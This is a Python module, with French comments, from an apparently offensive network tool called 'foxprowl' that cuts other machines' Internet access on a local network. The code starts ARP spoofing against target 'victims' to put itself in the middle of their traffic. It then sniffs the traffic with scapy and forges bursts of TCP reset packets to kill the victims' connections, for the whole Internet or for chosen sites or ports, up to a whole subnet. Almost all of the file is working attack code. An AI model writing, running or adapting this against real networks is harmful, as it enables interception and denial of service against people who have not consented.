"""
modules/internet_control.py
Contrôle d'accès Internet COMPLET.
- Blocage total Internet
- Blocage sélectif par domaine (youtube.com, tiktok.com, etc.)
- Blocage par port (443 pour HTTPS, etc.)
- Intégration automatique avec ARP Spoofing
- Support multi-cibles

Exemples d'utilisation (selon les specs):
- foxprowl block --target 192.168.1.37 --sites youtube.com tiktok.com
- foxprowl block --target 192.168.1.0/24 --full-internet
- foxprowl block --target 192.168.1.55 --port 443
"""
import time
import threading
from typing import List, Set, Dict, Optional
from dataclasses import dataclass

from scapy.all import sniff, send, sendp, IP, TCP, Ether, ICMP, UDP

from core.logger import log
from core.config import conf, attack_conf
from core.utils import resolve_domain, resolve_domains_batch, expand_cidr, is_valid_cidr, Counter
from core.network import NetworkDiscovery
from modules.arp_spoof import ARPSpoofer
from modules.tcp_killer import TCPKiller


@dataclass
class BlockStats:
    """Statistiques de blocage."""
    connections_killed: int = 0
    packets_dropped: int = 0
    dns_blocked: int = 0
    icmp_blocked: int = 0


class InternetBlocker:
    """
    Bloqueur d'Internet avancé.
    
    Modes:
    - FULL: Bloque tout le trafic Internet (sauf whitelist)
    - SELECTIVE: Bloque uniquement certains domaines/IPs
    - PORT: Bloque uniquement certains ports
    
    Fonctionne en combinaison avec ARP Spoofing pour intercepter le trafic.
    """
    
    def __init__(
        self,
        targets: List[str] = None,
        blocked_domains: List[str] = None,
        blocked_ports: List[int] = None,
        full_block: bool = False,
        whitelist_ips: Set[str] = None,
        auto_arp: bool = True
    ):
        """
        :param targets: IPs ou CIDR des victimes (ex: ["192.168.1.37"] ou ["192.168.1.0/24"])
        :param blocked_domains: Domaines à bloquer (ex: ["youtube.com", "tiktok.com"])
        :param blocked_ports: Ports à bloquer (ex: [443, 80])
        :param full_block: Si True, bloque TOUT Internet
        :param whitelist_ips: IPs à ne jamais bloquer (ex: gateway, notre IP)
        :param auto_arp: Démarrer automatiquement l'ARP Spoofing
        """
        # Cibles
        self.target_ips: Set[str] = set()
        self._expand_targets(targets or [])
        
        # Ce qu'on bloque
        self.blocked_domains = blocked_domains or []
        self.blocked_ports = set(blocked_ports) if blocked_ports else set()
        self.full_block = full_block
        
        # IPs bloquées (résolues depuis les domaines)
        self.blocked_ips: Set[str] = set()
        
        # Whitelist (ne jamais bloquer)
        self.whitelist_ips: Set[str] = whitelist_ips or set()
        self._setup_whitelist()
        
        # Auto ARP
        self.auto_arp = auto_arp
        self._arp_spoofer: Optional[ARPSpoofer] = None
        
        # État
        self.running = False
        self._main_thread: Optional[threading.Thread] = None
        self._dns_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        
        # Stats
        self.stats = BlockStats()
        self.start_time: float = 0.0
    
    def _expand_targets(self, targets: List[str]):
        """Expanse les targets (CIDR, IPs simples)."""
        for target in targets:
            if is_valid_cidr(target):
                # Expandre le CIDR
                expanded = expand_cidr(target)
                # Retirer notre IP et la gateway
                for ip in expanded:
                    if ip != conf.attacker_ip and ip != conf.gateway_ip:
                        self.target_ips.add(ip)
            else:
                if target != conf.attacker_ip and target != conf.gateway_ip:
                    self.target_ips.add(target)
    
    def _setup_whitelist(self):
        """Configure la whitelist de base."""
        # Toujours whitelister notre IP et la gateway
        if conf.attacker_ip:
            self.whitelist_ips.add(conf.attacker_ip)
        if conf.gateway_ip:
            self.whitelist_ips.add(conf.gateway_ip)
        
        # Whitelister les serveurs DNS courants pour ne pas bloquer la résolution
        # (sauf si on fait du DNS spoofing, mais c'est géré ailleurs)
        dns_servers = {"8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1"}
        # On ne les ajoute PAS à la whitelist pour le mode full_block
    
    def _resolve_domains_loop(self):
        """Thread de résolution DNS continue."""
        while self.running:
            if self.blocked_domains:
                new_ips = set()
                
                for domain in self.blocked_domains:
                    clean_domain = domain.replace("*.", "").replace(".*", "")
                    
                    try:
                        ips = resolve_domain(clean_domain)
                        new_ips.update(ips)
                        
                        # Sous-domaines courants
                        for prefix in ["www", "m", "mobile", "api", "cdn", "static"]:
                            sub_ips = resolve_domain(f"{prefix}.{clean_domain}")
                            new_ips.update(sub_ips)
                    except Exception:
                        pass
                
                with self._lock:
                    self.blocked_ips.update(new_ips)
                
                if new_ips:
                    log.info(f"DNS résolu: {len(new_ips)} IPs pour les domaines bloqués")
            
            # Refresh toutes les 20 secondes
            for _ in range(20):
                if not self.running:
                    break
                time.sleep(1)
    
    def _should_block(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> bool:
        """Détermine si un paquet doit être bloqué."""
        # Déterminer quelle est l'IP distante (serveur)
        if src_ip in self.target_ips:
            remote_ip = dst_ip
            remote_port = dst_port
        elif dst_ip in self.target_ips:
            remote_ip = src_ip
            remote_port = src_port
        else:
            # Paquet ne concernant pas nos cibles
            return False
        
        # Ne jamais bloquer la whitelist
        if remote_ip in self.whitelist_ips:
            return False
        
        # Mode FULL: tout bloquer (sauf whitelist)
        if self.full_block:
            return True
        
        # Mode PORT: bloquer certains ports
        if self.blocked_ports:
            if remote_port in self.blocked_ports:
                return True
        
        # Mode DOMAIN: bloquer certaines IPs
        if self.blocked_ips:
            with self._lock:
                if remote_ip in self.blocked_ips:
                    return True
        
        return False
    
    def _send_multi_rst(self, src_ip: str, dst_ip: str, 
                        src_port: int, dst_port: int,
                        seq: int, ack: int):
        """Envoie des RST agressifs pour tuer la connexion."""
        try:
            # 4 RST dans chaque direction avec variation SEQ
            for i in range(attack_conf.RST_PACKET_COUNT):
                # RST vers destination
                rst1 = IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=src_port, dport=dst_port,
                    flags="R", seq=seq + i * 1000
                )
                send(rst1, verbose=False, iface=conf.interface)
                
                # RST vers source
                rst2 = IP(src=dst_ip, dst=src_ip) / TCP(
                    sport=dst_port, dport=src_port,
                    flags="R", seq=ack + i * 1000
                )
                send(rst2, verbose=False, iface=conf.interface)
            
            # RST+ACK bonus
            rst_ack = IP(src=dst_ip, dst=src_ip) / TCP(
                sport=dst_port, dport=src_port,
                flags="RA", seq=ack, ack=seq + 1
            )
            send(rst_ack, verbose=False, iface=conf.interface)
            
            self.stats.connections_killed += 1
            
        except Exception:
            pass
    
    def _packet_callback(self, pkt):
        """Callback pour traiter chaque paquet."""
        if not pkt.haslayer(IP):
            return
        
        ip_layer = pkt[IP]
        src_ip = ip_layer.src
        dst_ip = ip_layer.dst
        
        # TCP
        if pkt.haslayer(TCP):
            tcp = pkt[TCP]
            flags = int(tcp.flags)
            
            # Ignorer nos RST
            if flags & 0x04 and src_ip == conf.attacker_ip:
                return
            
            if self._should_block(src_ip, dst_ip, tcp.sport, tcp.dport):
                # Tuer avec RST (plus efficace que drop)
                self._send_multi_rst(
                    src_ip, dst_ip,
                    tcp.sport, tcp.dport,
                    tcp.seq, tcp.ack
                )
        
        # UDP (surtout pour DNS, streaming, etc.)
        elif pkt.haslayer(UDP):
            udp = pkt[UDP]
            if self._should_block(src_ip, dst_ip, udp.sport, udp.dport):
                # Pour UDP, on ne peut pas envoyer de RST
                # On compte juste pour les stats (le paquet est déjà intercepté)
                self.stats.packets_dropped += 1
        
        # ICMP (ping)
        elif pkt.haslayer(ICMP):
            if self.full_block:
                # On peut répondre avec "Destination Unreachable"
                self.stats.icmp_blocked += 1
    
    def _build_bpf_filter(self) -> str:
        """Construit le filtre BPF."""
        if not self.target_ips:
            return "tcp or udp or icmp"
        
        # Filter sur les IPs cibles
        ip_filters = [f"host {ip}" for ip in list(self.target_ips)[:10]]  # Max 10 pour perf
        return f"({' or '.join(ip_filters)}) and (tcp or udp or icmp)"
    
    def _main_loop(self):
        """Boucle principale de blocage."""
        bpf = self._build_bpf_filter()
        log.info(f"Filtre BPF: {bpf[:80]}...")
        
        try:
            sniff(
                iface=conf.interface,
                filter=bpf,
                prn=self._packet_callback,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Erreur blocage: {e}")
    
    def start(self):
        """Démarre le blocage Internet."""
        if self.running:
            return
        
        if not self.target_ips:
            log.error("Aucune cible définie!")
            return
        
        self.running = True
        self.start_time = time.time()
        
        # Démarrer ARP Spoofing automatiquement si nécessaire
        if self.auto_arp and not conf.arp_spoofing_active:
            log.info("Démarrage automatique de l'ARP Spoofing...")
            self._arp_spoofer = ARPSpoofer(targets=list(self.target_ips))
            self._arp_spoofer.start()
            time.sleep(2)  # Attendre que le MITM soit en place
        
        # Résolution DNS si on a des domaines
        if self.blocked_domains:
            log.info(f"Domaines bloqués: {', '.join(self.blocked_domains)}")
            self._dns_thread = threading.Thread(target=self._resolve_domains_loop, daemon=True)
            self._dns_thread.start()
            time.sleep(1)  # Première résolution
        
        # Log de démarrage
        mode = "TOTAL" if self.full_block else "SÉLECTIF"
        log.attack(f"Blocage Internet {mode} activé")
        log.info(f"  Cibles: {len(self.target_ips)} machine(s)")
        
        if self.blocked_ports:
            log.info(f"  Ports bloqués: {self.blocked_ports}")
        if self.blocked_ips:
            log.info(f"  IPs bloquées: {len(self.blocked_ips)}")
        
        # Démarrer le blocage
        self._main_thread = threading.Thread(target=self._main_loop, daemon=True)
        self._main_thread.start()
        
        log.warning("Blocage actif - Ctrl+C pour arrêter")
    
    def stop(self):
        """Arrête le blocage."""
        if not self.running:
            return
        
        log.info("Arrêt du blocage Internet...")
        self.running = False
        
        # Arrêter l'ARP Spoofing si on l'a démarré
        if self._arp_spoofer:
            self._arp_spoofer.stop()
            self._arp_spoofer = None
        
        if self._main_thread and self._main_thread.is_alive():
            self._main_thread.join(timeout=3.0)
        
        if self._dns_thread and self._dns_thread.is_alive():
            self._dns_thread.join(timeout=2.0)
        
        duration = time.time() - self.start_time
        log.success(
            f"Blocage arrêté. "
            f"Durée: {duration:.1f}s, "
            f"Connexions tuées: {self.stats.connections_killed}, "
            f"Paquets droppés: {self.stats.packets_dropped}"
        )
    
    def add_blocked_domain(self, domain: str):
        """Ajoute un domaine à bloquer."""
        if domain not in self.blocked_domains:
            self.blocked_domains.append(domain)
            ips = resolve_domain(domain)
            with self._lock:
                self.blocked_ips.update(ips)
            log.info(f"Domaine bloqué: {domain} ({len(ips)} IPs)")
    
    def add_blocked_port(self, port: int):
        """Ajoute un port à bloquer."""
        self.blocked_ports.add(port)
        log.info(f"Port bloqué: {port}")
    
    def add_target(self, ip: str):
        """Ajoute une cible à bloquer."""
        self.target_ips.add(ip)
        if self._arp_spoofer:
            self._arp_spoofer.add_target(ip)
        log.info(f"Cible ajoutée: {ip}")
    
    def get_stats(self) -> dict:
        """Retourne les statistiques."""
        return {
            "running": self.running,
            "mode": "full" if self.full_block else "selective",
            "targets": len(self.target_ips),
            "connections_killed": self.stats.connections_killed,
            "packets_dropped": self.stats.packets_dropped,
            "blocked_domains": self.blocked_domains,
            "blocked_ports": list(self.blocked_ports),
            "blocked_ips": len(self.blocked_ips),
            "duration": time.time() - self.start_time if self.start_time else 0
        }
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, *args):
        self.stop()
        return False


# Fonction helper pour usage simplifié
def block_internet(
    target: str,
    sites: List[str] = None,
    ports: List[int] = None,
    full: bool = False
) -> InternetBlocker:
    """
    Helper pour bloquer Internet facilement.
    
    Exemples:
        block_internet("192.168.1.37", sites=["youtube.com", "tiktok.com"])
        block_internet("192.168.1.0/24", full=True)
        block_internet("192.168.1.55", ports=[443, 80])
    """
    blocker = InternetBlocker(
        targets=[target],
        blocked_domains=sites,
        blocked_ports=ports,
        full_block=full
    )
    return blocker